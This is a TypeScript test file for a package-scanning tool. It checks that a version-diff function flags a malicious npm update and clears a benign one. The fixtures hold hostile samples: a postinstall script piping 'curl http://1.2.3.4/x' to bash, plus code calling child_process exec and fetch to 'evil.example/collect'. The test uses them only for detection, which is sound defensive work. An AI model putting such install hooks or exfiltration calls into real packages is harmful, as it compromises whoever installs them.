import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { SqliteCache } from '../cache/sqlite-cache';
import { noopLogger } from '../logger';
import { toPurl } from '../inventory/purl';
import type { EcosystemAdapter, EcosystemParseResult } from '../types/adapter';
import type { HttpClient, ScanContext } from '../types/context';
import type { PackageRef } from '../types/ecosystem';
import type { FetchedTarball, RegistryMetadata } from '../types/registry';
import { diffVersions } from './version-diff';

const tmpDirs: string[] = [];
const caches: SqliteCache[] = [];
afterEach(async () => {
  for (const c of caches.splice(0)) c.close();
  await Promise.all(tmpDirs.splice(0).map((d) => rm(d, { recursive: true, force: true })));
});

async function srcDir(indexJs: string): Promise<string> {
  const dir = await mkdtemp(join(tmpdir(), 'venom-diff-'));
  tmpDirs.push(dir);
  await writeFile(join(dir, 'index.js'), indexJs);
  return dir;
}

/** Adapter returning canned metadata + extracted-tarball dirs per version. */
class FakeAdapter implements EcosystemAdapter {
  readonly ecosystem = 'npm' as const;
  constructor(
    private readonly byVersion: Record<string, { meta: RegistryMetadata; dir: string }>,
  ) {}
  async parseProject(): Promise<EcosystemParseResult | null> {
    return null;
  }
  purl(ref: PackageRef): string {
    return toPurl(ref);
  }
  async fetchMetadata(ref: PackageRef): Promise<RegistryMetadata | null> {
    return this.byVersion[ref.version]?.meta ?? null;
  }
  async fetchTarball(ref: PackageRef): Promise<FetchedTarball | null> {
    const dir = this.byVersion[ref.version]?.dir;
    return dir
      ? { ref, extractedPath: dir, totalBytes: 0, fileCount: 1, dispose: async () => {} }
      : null;
  }
  async popularNames(): Promise<string[]> {
    return [];
  }
}

const throwingHttp: HttpClient = {
  getJson: () => Promise.reject(new Error('no network')),
  getText: () => Promise.reject(new Error('no network')),
  getBuffer: () => Promise.reject(new Error('no network')),
  postJson: () => Promise.reject(new Error('no network')),
};
function ctx(): ScanContext {
  const cache = new SqliteCache(':memory:');
  caches.push(cache);
  return {
    projectRoot: '/x',
    config: { offline: false, dataDir: '/x' },
    http: throwingHttp,
    cache,
    logger: noopLogger,
  };
}

function meta(
  version: string,
  maintainers: string[],
  scripts: Record<string, string>,
): RegistryMetadata {
  return {
    ref: { ecosystem: 'npm', name: 'pkg', version },
    maintainers: maintainers.map((username) => ({ username })),
    hasInstallScripts: Object.keys(scripts).length > 0,
    installScripts: scripts,
  };
}

describe('diffVersions', () => {
  it('flags a benign → malicious update (new maintainer, install script, network+exec)', async () => {
    const fromDir = await srcDir('export const x = 1;\n');
    const toDir = await srcDir(
      "const cp = require('child_process');\ncp.exec('id');\nfetch('http://evil.example/collect');\n",
    );
    const adapter = new FakeAdapter({
      '1.0.0': { meta: meta('1.0.0', ['alice'], {}), dir: fromDir },
      '2.0.0': {
        meta: meta('2.0.0', ['alice', 'attacker'], { postinstall: 'curl http://1.2.3.4/x | bash' }),
        dir: toDir,
      },
    });

    const d = await diffVersions('npm', 'pkg', '1.0.0', '2.0.0', ctx(), { adapter });

    expect(d.verdict).toBe('flagged');
    expect(d.maintainersAdded).toEqual(['attacker']);
    expect(d.dangerousInstallScripts.length).toBeGreaterThan(0);
    expect(d.capabilitiesIntroduced).toEqual(expect.arrayContaining(['network', 'child-process']));
    expect(d.findings[0]?.ruleId).toBe('venom/version-diff');
  });

  it('is clear when nothing security-relevant changed', async () => {
    const a = await srcDir('export const x = 1;\n');
    const b = await srcDir('export const x = 2;\n');
    const adapter = new FakeAdapter({
      '1.0.0': { meta: meta('1.0.0', ['alice'], {}), dir: a },
      '1.0.1': { meta: meta('1.0.1', ['alice'], {}), dir: b },
    });
    const d = await diffVersions('npm', 'pkg', '1.0.0', '1.0.1', ctx(), { adapter });
    expect(d.verdict).toBe('clear');
    expect(d.findings).toEqual([]);
  });
});
